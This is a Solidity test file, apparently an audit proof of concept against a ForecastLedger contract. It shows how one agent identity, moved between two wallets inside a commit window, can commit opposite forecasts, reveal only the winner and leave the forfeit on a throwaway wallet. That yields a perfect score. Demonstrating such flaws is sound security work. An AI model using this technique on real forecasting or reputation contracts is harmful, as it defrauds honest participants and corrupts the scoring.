// SPDX-License-Identifier: MIT
pragma solidity 0.8.39;

import {Base} from "../Base.t.sol";
import {ForecastLedger} from "../../src/ForecastLedger.sol";

/// PoC: one Agent ID, two live commits in the same round (burn and reissue to a second wallet inside the commit
/// window), opposite forecasts, reveal only the winner once the market resolves inside the reveal window.
/// Assumes the real Agent ID can move to another wallet within a commit window, as the mock and threat 19 allow.
contract DoubleCommitSelectiveRevealPoC is Base {
    bytes32 constant SALT = keccak256("salt");

    function test_poc_oneIdentityTwoCommitsRevealWinner() public {
        address mallory1 = makeAddr("mallory1");
        address mallory2 = makeAddr("mallory2");
        aid.mintTo(mallory1, "mallory");
        (uint256 id, ForecastLedger.QuestionInput[] memory qs) = _createRound(1);
        _commit(id, alice, 7000, SALT); // honest
        _commit(id, mallory1, 0, SALT); // No with certainty
        vm.prank(mallory1);
        aid.burn("mallory");
        aid.mintTo(mallory2, "mallory"); // same identity, new wallet
        _commit(id, mallory2, 10_000, SALT); // Yes with certainty
        _commitBaseline(id, 6000, SALT);

        _toReveal(id);
        vm.prank(keeper);
        ledger.revealBaseline(id, 6000, SALT);
        vm.prank(alice);
        ledger.reveal(id, 7000, SALT);
        _resolve(qs[0], true); // resolves inside the reveal window
        ledger.finalizeQuestion(id, 0);
        vm.prank(mallory2);
        ledger.reveal(id, 10_000, SALT); // only the winning side is revealed

        _toScoring(id);
        ledger.score(id, alice);
        ledger.score(id, mallory2);
        ledger.forfeit(id, mallory1); // lands on the throwaway wallet

        ForecastLedger.Stats memory m = ledger.getStats(mallory2);
        assertEq(m.sumBrier, 0); // perfect score
        assertEq(m.sumSkill, int64(4000 * 4000)); // maximum possible skill
        assertEq(m.roundsForfeited, 0);
        assertGt(m.sumSkill, ledger.getStats(alice).sumSkill); // beats the honest forecaster with zero information
        assertEq(aid.balanceOf(mallory2), 1); // the identity lives on the clean wallet
    }
}
